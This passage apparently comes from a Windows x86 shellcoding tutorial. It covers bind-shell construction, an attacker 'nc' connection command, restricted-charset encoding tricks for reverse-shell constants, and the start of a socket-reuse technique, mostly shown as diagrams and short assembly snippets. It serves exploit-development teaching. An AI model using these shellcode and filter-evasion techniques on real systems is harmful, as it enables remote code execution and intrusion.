  <text x="108" y="86" text-anchor="middle" fill="#ff3366" font-size="9">??</text>
  <rect x="126" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#ff3366" stroke-width="1"/>
  <text x="140" y="86" text-anchor="middle" fill="#ff3366" font-size="9">??</text>
  <text x="175" y="86" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <!-- After -->
  <text x="470" y="58" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">After (68 iterations)</text>
  <rect x="380" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="394" y="86" text-anchor="middle" fill="#00ff88" font-size="9">00</text>
  <rect x="412" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="426" y="86" text-anchor="middle" fill="#00ff88" font-size="9">00</text>
  <rect x="444" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="458" y="86" text-anchor="middle" fill="#00ff88" font-size="9">00</text>
  <rect x="476" y="68" width="28" height="28" rx="2" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="490" y="86" text-anchor="middle" fill="#00ff88" font-size="9">00</text>
  <text x="525" y="86" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <!-- Mechanism -->
  <rect x="80" y="115" width="590" height="95" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="138" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">How rep stosb Works</text>
  <text x="140" y="162" text-anchor="middle" fill="#ff6b35" font-size="11">AL = 0x00</text>
  <text x="300" y="162" text-anchor="middle" fill="#ff6b35" font-size="11">ECX = 68 (0x44)</text>
  <text x="500" y="162" text-anchor="middle" fill="#ff6b35" font-size="11">EDI = destination</text>
  <text x="375" y="185" text-anchor="middle" fill="#e0e7ff" font-size="11">Each iteration: [EDI] = AL, EDI++, ECX--</text>
  <text x="375" y="202" text-anchor="middle" fill="#00ff88" font-size="11">Stops when ECX reaches 0. Two instructions instead of 17 pushes.</text>
</svg></div>

*Figure 11.0 - rep stosb writes AL (zero) to each byte at EDI, advancing EDI and decrementing ECX until ECX reaches zero.*

```nasm
zero_structs:
    xor   eax, eax         ; AL = 0
    xor   ecx, ecx
    mov   cl, 0x44          ; ECX = 68
    sub   esp, ecx
    mov   edi, esp
    push  ecx
    rep   stosb             ; Zero 68 bytes
    pop   ecx
    sub   edi, ecx          ; Reset EDI to start
```

> `rep stosb` is significantly more compact than pushing 17 individual zero DWORDs.

### Key Difference: Two Socket Handles

> **Critical detail:** `accept` returns a *new* socket handle for the connected client. This is the handle we use for the STARTUPINFOA stdio redirect -- not the original listening socket. Using the wrong socket is a common mistake.

<div align="center"><svg viewBox="0 0 750 380" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs>
  <marker id="ba-g" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  <marker id="ba-o" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff6b35"/></marker>
</defs>
<rect width="750" height="380" rx="8" fill="#0a0e17"/>
<text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="16" font-weight="bold">Bind Shell Flow</text>
<rect x="30" y="55" width="130" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="95" y="75" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">1. bind()</text>
<text x="95" y="92" text-anchor="middle" fill="#e0e7ff" font-size="9">0.0.0.0:4444</text>
<line x1="160" y1="82" x2="185" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ba-g)"/>
<rect x="190" y="55" width="130" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="255" y="75" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">2. listen()</text>
<text x="255" y="92" text-anchor="middle" fill="#e0e7ff" font-size="9">backlog = 1</text>
<line x1="320" y1="82" x2="345" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ba-g)"/>
<rect x="350" y="55" width="130" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
<text x="415" y="75" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">3. accept()</text>
<text x="415" y="92" text-anchor="middle" fill="#e0e7ff" font-size="9">BLOCKS here</text>
<line x1="480" y1="82" x2="505" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ba-g)"/>
<rect x="510" y="55" width="130" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="575" y="75" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">4. Spawn shell</text>
<text x="575" y="92" text-anchor="middle" fill="#e0e7ff" font-size="9">CreateProcessA</text>
<rect x="280" y="145" width="190" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
<text x="375" y="165" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">ATTACKER connects in</text>
<text x="375" y="182" text-anchor="middle" fill="#e0e7ff" font-size="10">nc 192.168.1.5 4444</text>
<line x1="375" y1="145" x2="415" y2="115" stroke="#ff6b35" stroke-width="1.5" stroke-dasharray="6,3" marker-end="url(#ba-o)"/>
<rect x="60" y="230" width="290" height="120" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
<text x="205" y="252" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">Two Socket Handles</text>
<rect x="80" y="264" width="250" height="24" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1"/>
<text x="205" y="280" text-anchor="middle" fill="#ff6b35" font-size="10">listenSock (from WSASocketA)</text>
<rect x="80" y="296" width="250" height="24" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1"/>
<text x="205" y="312" text-anchor="middle" fill="#00ff88" font-size="10">clientSock (from accept) --> used for stdio</text>
<text x="205" y="342" text-anchor="middle" fill="#ff3366" font-size="10">Use clientSock, NOT listenSock!</text>
<rect x="400" y="230" width="310" height="120" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
<text x="555" y="252" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">vs. Reverse Shell</text>
<text x="555" y="275" text-anchor="middle" fill="#e0e7ff" font-size="10">Reverse: connect() returns 0 on success.</text>
<text x="555" y="293" text-anchor="middle" fill="#e0e7ff" font-size="10">Uses SAME socket for everything.</text>
<text x="555" y="316" text-anchor="middle" fill="#e0e7ff" font-size="10">Bind: accept() returns a NEW socket.</text>
<text x="555" y="334" text-anchor="middle" fill="#e0e7ff" font-size="10">Must use the NEW one for stdio.</text>
</svg></div>

*Figure 11.1 - Bind shell sequence: bind to a port, listen, block on accept, then spawn a shell using the accepted client socket.*

### PoC Video

The following video demonstrates the bind shell shellcode listening on a port and accepting an incoming connection in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/bind-shell-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Bind shell accepting incoming connection*

---

## 12. Working Under Restrictions: A Case Study

What if the vulnerability filters out far more than just `0x00`? Real-world exploits often have extensive bad character lists. When half the byte range is off limits, every constant must be constructed indirectly.

<div align="center"><svg viewBox="0 0 750 380" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="380" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Encoding Adapter: Raw Value to Null-Free Assembly</text>
  <!-- Raw value -->
  <rect x="40" y="50" width="200" height="45" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="140" y="70" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Raw Constant</text>
  <text x="140" y="86" text-anchor="middle" fill="#e0e7ff" font-size="11">Contains bad bytes</text>
  <!-- Arrow -->
  <text x="290" y="76" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">---></text>
  <!-- Encoding layer -->
  <rect x="330" y="50" width="200" height="45" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="430" y="70" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">Encoding Layer</text>
  <text x="430" y="86" text-anchor="middle" fill="#e0e7ff" font-size="11">Transform pattern</text>
  <!-- Arrow -->
  <text x="575" y="76" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">---></text>
  <!-- Clean output -->
  <rect x="610" y="50" width="110" height="45" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="665" y="70" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">Clean ASM</text>
  <text x="665" y="86" text-anchor="middle" fill="#e0e7ff" font-size="11">No bad chars</text>
  <!-- Pattern examples -->
  <rect x="40" y="115" width="330" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="55" y="136" fill="#00d4ff" font-size="11" font-weight="bold">NEG:</text>
  <text x="165" y="136" text-anchor="middle" fill="#ff3366" font-size="11">0x06</text>
  <text x="215" y="136" text-anchor="middle" fill="#8b949e" font-size="11">-></text>
  <text x="310" y="136" text-anchor="middle" fill="#00ff88" font-size="11">mov al,0xFA; neg al</text>
  <text x="205" y="158" text-anchor="middle" fill="#8b949e" font-size="10">NEG flips sign: 0x100 - 0xFA = 0x06</text>
  <rect x="40" y="178" width="330" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="55" y="199" fill="#00d4ff" font-size="11" font-weight="bold">XOR:</text>
  <text x="165" y="199" text-anchor="middle" fill="#ff3366" font-size="11">0x0501A8C0</text>
  <text x="225" y="199" text-anchor="middle" fill="#8b949e" font-size="11">-></text>
  <text x="310" y="199" text-anchor="middle" fill="#00ff88" font-size="11">mov+xor 0x50505050</text>
  <text x="205" y="221" text-anchor="middle" fill="#8b949e" font-size="10">XOR with key: 0x5551F890 ^ 0x50505050</text>
  <rect x="380" y="115" width="340" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="395" y="136" fill="#00d4ff" font-size="11" font-weight="bold">SHL:</text>
  <text x="520" y="136" text-anchor="middle" fill="#ff3366" font-size="11">0xBB01</text>
  <text x="570" y="136" text-anchor="middle" fill="#8b949e" font-size="11">-></text>
  <text x="660" y="136" text-anchor="middle" fill="#00ff88" font-size="11">al=0xBB; shl; inc</text>
  <text x="550" y="158" text-anchor="middle" fill="#8b949e" font-size="10">Build port 443 byte-by-byte</text>
  <rect x="380" y="178" width="340" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="395" y="199" fill="#00d4ff" font-size="11" font-weight="bold">NOT:</text>
  <text x="520" y="199" text-anchor="middle" fill="#ff3366" font-size="11">0x00000100</text>
  <text x="570" y="199" text-anchor="middle" fill="#8b949e" font-size="11">-></text>
  <text x="660" y="199" text-anchor="middle" fill="#00ff88" font-size="11">push ~val; not eax</text>
  <text x="550" y="221" text-anchor="middle" fill="#8b949e" font-size="10">0xFFFFFEFF has no null bytes</text>
  <!-- Split ROR + INC/DEC -->
  <rect x="40" y="245" width="330" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="55" y="266" fill="#00d4ff" font-size="11" font-weight="bold">Split ROR:</text>
  <text x="205" y="266" text-anchor="middle" fill="#ff3366" font-size="11">ror edx,0x0D (bad!)</text>
  <text x="205" y="288" text-anchor="middle" fill="#00ff88" font-size="10">ror edx,0x07; ror edx,0x06 (7+6=13)</text>
  <rect x="380" y="245" width="340" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="395" y="266" fill="#00d4ff" font-size="11" font-weight="bold">INC/DEC:</text>
  <text x="550" y="266" text-anchor="middle" fill="#ff3366" font-size="11">mov eax, 2 (bad!)</text>
  <text x="550" y="288" text-anchor="middle" fill="#00ff88" font-size="10">xor eax,eax; inc eax; inc eax</text>
  <!-- Summary -->
  <rect x="120" y="318" width="510" height="42" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="338" text-anchor="middle" fill="#00ff88" font-size="12">The same shellcode logic, with an encoding wrapper around every constant.</text>
  <text x="375" y="354" text-anchor="middle" fill="#8b949e" font-size="10">Patterns are composable: a single value might need shift + NOT + INC.</text>
</svg></div>

*Figure 12.1 - The encoding adapter concept: each raw constant passes through a transform pattern that produces the same value using only safe bytes.*

The core encoding patterns for a restricted-charset reverse shell:

**NEG for small constants:** `mov al, 0xFA; neg al` produces `0x06` (IPPROTO_TCP).

**XOR for multi-byte values:** `mov eax, 0x5551F890; xor eax, 0x50505050` produces `0x0501A8C0` (an IP address).

**Shift chains for port numbers:** `mov al, 0xBB; shl eax, cl; inc eax` builds `0xBB01` (port 443 in NBO) one byte at a time.

**INC/DEC chains:** `xor eax, eax; inc eax; inc eax` builds AF_INET (2).

**Split ROR:** `ror edx, 0x07; ror edx, 0x06` replaces `ror edx, 0x0d` when `0x0D` is a bad character.

**Field-by-field struct construction:** Allocate space, then fill each field individually with `mov word/dword ptr`.

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="340" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Restricted Charset Encoding Pipeline</text>
  <rect x="30" y="50" width="185" height="180" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="122" y="72" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Original Bytes</text>
  <text x="45" y="96" fill="#00ff88" font-size="10">31 C9</text><text x="105" y="96" fill="#ff3366" font-size="10" font-weight="bold">00 0D</text><text x="155" y="96" fill="#00ff88" font-size="10">8B 71</text>
  <text x="45" y="116" fill="#00ff88" font-size="10">89 E5</text><text x="105" y="116" fill="#ff3366" font-size="10" font-weight="bold">0A 00</text><text x="155" y="116" fill="#00ff88" font-size="10">FC AC</text>
  <text x="45" y="136" fill="#00ff88" font-size="10">C1 CA</text><text x="105" y="136" fill="#ff3366" font-size="10" font-weight="bold">00 20</text><text x="155" y="136" fill="#00ff88" font-size="10">EB F4</text>
  <text x="45" y="156" fill="#00ff88" font-size="10">3B 54</text><text x="105" y="156" fill="#ff3366" font-size="10" font-weight="bold">00 00</text><text x="155" y="156" fill="#00ff88" font-size="10">8B 57</text>
  <rect x="50" y="170" width="145" height="22" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1"/>
  <text x="122" y="186" text-anchor="middle" fill="#ff3366" font-size="10">8 bad bytes found</text>
  <text x="122" y="218" text-anchor="middle" fill="#8b949e" font-size="9">Size: 142 bytes</text>
  <line x1="215" y1="140" x2="255" y2="140" stroke="#ff6b35" stroke-width="2"/><polygon points="252,135 262,140 252,145" fill="#ff6b35"/>
  <rect x="265" y="55" width="220" height="170" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="375" y="78" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">Encoding Engine</text>
  <line x1="285" y1="88" x2="465" y2="88" stroke="#8b949e" stroke-width="0.5"/>
  <text x="285" y="110" fill="#00d4ff" font-size="10">XOR Zeroing</text><text x="410" y="110" fill="#e0e7ff" font-size="9">0x00 -> xor r,r</text>
  <text x="285" y="130" fill="#00d4ff" font-size="10">NOT Encode</text><text x="410" y="130" fill="#e0e7ff" font-size="9">push ~val; not</text>
  <text x="285" y="150" fill="#00d4ff" font-size="10">NEG Byte</text><text x="410" y="150" fill="#e0e7ff" font-size="9">0x06 -> neg 0xFA</text>
  <text x="285" y="170" fill="#00d4ff" font-size="10">SHL Build</text><text x="410" y="170" fill="#e0e7ff" font-size="9">byte-by-byte</text>
  <text x="285" y="190" fill="#00d4ff" font-size="10">XOR Key</text><text x="410" y="190" fill="#e0e7ff" font-size="9">val ^ 0x50505050</text>
  <text x="285" y="210" fill="#00d4ff" font-size="10">INC/DEC</text><text x="410" y="210" fill="#e0e7ff" font-size="9">small values</text>
  <line x1="485" y1="140" x2="525" y2="140" stroke="#00ff88" stroke-width="2"/><polygon points="522,135 532,140 522,145" fill="#00ff88"/>
  <rect x="535" y="50" width="185" height="180" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="627" y="72" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">Clean Shellcode</text>
  <text x="550" y="96" fill="#00ff88" font-size="10">31 C9</text><text x="610" y="96" fill="#00ff88" font-size="10">33 C9</text><text x="660" y="96" fill="#00ff88" font-size="10">8B 71</text>
  <text x="550" y="116" fill="#00ff88" font-size="10">89 E5</text><text x="610" y="116" fill="#00ff88" font-size="10">81 C4</text><text x="660" y="116" fill="#00ff88" font-size="10">FC AC</text>
  <text x="550" y="136" fill="#00ff88" font-size="10">C1 CA</text><text x="610" y="136" fill="#00ff88" font-size="10">F9 F0</text><text x="660" y="136" fill="#00ff88" font-size="10">EB F4</text>
  <text x="550" y="156" fill="#00ff88" font-size="10">3B 54</text><text x="610" y="156" fill="#00ff88" font-size="10">FF FF</text><text x="660" y="156" fill="#00ff88" font-size="10">8B 57</text>
  <rect x="555" y="170" width="145" height="22" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1"/>
  <text x="627" y="186" text-anchor="middle" fill="#00ff88" font-size="10">0 bad bytes!</text>
  <text x="627" y="218" text-anchor="middle" fill="#8b949e" font-size="9">Size: 186 bytes (+31%)</text>
  <rect x="100" y="260" width="550" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="282" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">Size vs. Safety Trade-off</text>
  <rect x="130" y="292" width="210" height="12" rx="3" fill="#00ff88" opacity="0.7"/><text x="237" y="302" text-anchor="middle" fill="#0a0e17" font-size="9" font-weight="bold">142 bytes (original)</text>
  <rect x="130" y="292" width="275" height="12" rx="3" fill="#ff6b35" opacity="0.4"/><text x="420" y="302" fill="#ff6b35" font-size="9">+44 encoding overhead</text>
  <text x="560" y="302" fill="#8b949e" font-size="9">= 186 bytes total</text>
</svg></div>

*Figure 12.2 - The encoding pipeline: bad bytes (red) pass through composable transforms to produce clean shellcode (green), at the cost of increased size.*

<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="300" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Bad Character Byte Map (Typical Restricted Set)</text>
  <rect x="200" y="42" width="12" height="12" rx="2" fill="#ff3366" opacity="0.8"/><text x="218" y="53" fill="#ff3366" font-size="10">Bad (blocked)</text>
  <rect x="330" y="42" width="12" height="12" rx="2" fill="#00ff88" opacity="0.3"/><text x="348" y="53" fill="#00ff88" font-size="10">Safe (usable)</text>
  <rect x="460" y="42" width="12" height="12" rx="2" fill="#ff6b35" opacity="0.5"/><text x="478" y="53" fill="#ff6b35" font-size="10">Caution</text>
  <!-- Headers -->
  <text x="130" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">x0</text><text x="165" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">x1</text><text x="200" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">x2</text><text x="235" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">x3</text>
  <text x="270" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">x4</text><text x="305" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">x5</text><text x="340" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">x6</text><text x="375" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">x7</text>
  <text x="410" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">x8</text><text x="445" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">x9</text><text x="480" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">xA</text><text x="515" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">xB</text>
  <text x="550" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">xC</text><text x="585" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">xD</text><text x="620" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">xE</text><text x="655" y="73" fill="#00d4ff" font-size="9" text-anchor="middle">xF</text>
  <!-- Row 0x0_ -->
  <text x="105" y="93" fill="#00d4ff" font-size="9" text-anchor="end">0x0_</text>
  <rect x="116" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.9"/><text x="130" y="93" text-anchor="middle" fill="#0a0e17" font-size="8" font-weight="bold">00</text>
  <rect x="151" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="165" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">01</text>
  <rect x="186" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="200" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">02</text>
  <rect x="221" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="235" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">03</text>
  <rect x="256" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="270" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">04</text>
  <rect x="291" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="305" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">05</text>
  <rect x="326" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="340" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">06</text>
  <rect x="361" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="375" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">07</text>
  <rect x="396" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="410" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">08</text>
  <rect x="431" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="445" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">09</text>
  <rect x="466" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.9"/><text x="480" y="93" text-anchor="middle" fill="#0a0e17" font-size="8" font-weight="bold">0A</text>
  <rect x="501" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="515" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">0B</text>
  <rect x="536" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="550" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">0C</text>
  <rect x="571" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.9"/><text x="585" y="93" text-anchor="middle" fill="#0a0e17" font-size="8" font-weight="bold">0D</text>
  <rect x="606" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="620" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">0E</text>
  <rect x="641" y="80" width="28" height="18" rx="2" fill="#ff3366" opacity="0.5"/><text x="655" y="93" text-anchor="middle" fill="#0a0e17" font-size="8">0F</text>
  <!-- Row 0x1_ -->
  <text x="105" y="113" fill="#00d4ff" font-size="9" text-anchor="end">0x1_</text>
  <rect x="116" y="100" width="548" height="18" rx="2" fill="#ff3366" opacity="0.35"/><text x="390" y="113" text-anchor="middle" fill="#e0e7ff" font-size="8">10..1F  (all control chars -- blocked)</text>
  <!-- Row 0x2_ -->
  <text x="105" y="133" fill="#00d4ff" font-size="9" text-anchor="end">0x2_</text>
  <rect x="116" y="120" width="28" height="18" rx="2" fill="#ff6b35" opacity="0.5"/><text x="130" y="133" text-anchor="middle" fill="#e0e7ff" font-size="8">20</text>
  <rect x="151" y="120" width="513" height="18" rx="2" fill="#00ff88" opacity="0.2"/><text x="407" y="133" text-anchor="middle" fill="#e0e7ff" font-size="8">21..2F  (mostly safe -- symbols and punctuation)</text>
  <!-- Rows 0x3_-7_ -->
  <text x="105" y="153" fill="#00d4ff" font-size="9" text-anchor="end">0x3_-7_</text>
  <rect x="116" y="140" width="548" height="18" rx="2" fill="#00ff88" opacity="0.2"/><text x="390" y="153" text-anchor="middle" fill="#00ff88" font-size="8">Printable ASCII: digits, uppercase, lowercase, symbols -- all safe</text>
  <!-- Rows 0x8_-F_ -->
  <text x="105" y="173" fill="#00d4ff" font-size="9" text-anchor="end">0x8_-F_</text>
  <rect x="116" y="160" width="548" height="18" rx="2" fill="#00ff88" opacity="0.2"/><text x="390" y="173" text-anchor="middle" fill="#00ff88" font-size="8">Extended bytes (0x80-0xFF): rarely restricted in binary exploit protocols</text>
  <!-- Worst offenders -->
  <rect x="80" y="195" width="590" height="45" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="375" y="214" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Most Common Bad Characters</text>
  <text x="140" y="232" fill="#ff3366" font-size="11">0x00 null</text><text x="255" y="232" fill="#ff3366" font-size="11">0x0A LF</text><text x="355" y="232" fill="#ff3366" font-size="11">0x0D CR</text>
  <text x="455" y="232" fill="#ff6b35" font-size="11">0x20 space</text><text x="575" y="232" fill="#ff6b35" font-size="11">0x25 %</text>
  <!-- Summary -->
  <rect x="100" y="254" width="550" height="30" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="274" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">~33 blocked + ~223 usable of 256 | Always run a full 0x00-0xFF bad char test first!</text>
</svg></div>

*Figure 12.3 - Bad character byte map. Null (0x00), LF (0x0A), and CR (0x0D) are almost always blocked. Extended bytes (0x80-0xFF) are rarely restricted.*

> The restricted-charset shellcode is not a separate technique -- it is the same shellcode with an encoding adapter wrapped around every constant.

With the networking payloads and encoding techniques covered, we now move into more advanced territory.

### PoC Video

The following video demonstrates the restricted-charset reverse shell executing successfully despite heavy bad character filtering in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/restricted-charset-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Restricted-charset shellcode executing cleanly*

---

## 13. Socket Reuse: Hijacking Existing Connections

Every shellcode technique so far creates a *new* network connection. **Socket reuse** sidesteps that by hijacking the very TCP socket the exploit already opened. No new connections, no new firewall rules to bypass.

### Handle Enumeration Strategy

We brute-force handle values from `0x50` to `0x400`, calling `getpeername()` on each. If it succeeds and the returned port matches ours, we have found our socket.

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="260" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Handle Brute-Force Scan</text>
  <text x="375" y="52" text-anchor="middle" fill="#8b949e" font-size="11">Testing handle values 0x50 to 0x400 with getpeername()</text>
  <!-- Handle boxes -->
  <rect x="35" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="67" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0x50</text>
  <text x="67" y="102" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
  <rect x="110" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="142" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0x54</text>
  <text x="142" y="102" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
  <rect x="185" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="217" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0x58</text>
  <text x="217" y="102" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
  <rect x="260" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="292" y="92" text-anchor="middle" fill="#8b949e" font-size="14">...</text>
  <rect x="335" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="367" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0x9C</text>
  <text x="367" y="102" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">X</text>
  <rect x="410" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="442" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0xA0</text>
  <text x="442" y="102" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">?</text>
  <rect x="485" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2.5"/>
  <text x="517" y="86" text-anchor="middle" fill="#e0e7ff" font-size="10">0xA4</text>
  <text x="517" y="102" text-anchor="middle" fill="#00ff88" font-size="14" font-weight="bold">V</text>
  <rect x="560" y="70" width="65" height="40" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="592" y="92" text-anchor="middle" fill="#8b949e" font-size="14">...</text>
  <rect x="635" y="70" width="80" height="40" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="675" y="86" text-anchor="middle" fill="#8b949e" font-size="10">0x400</text>
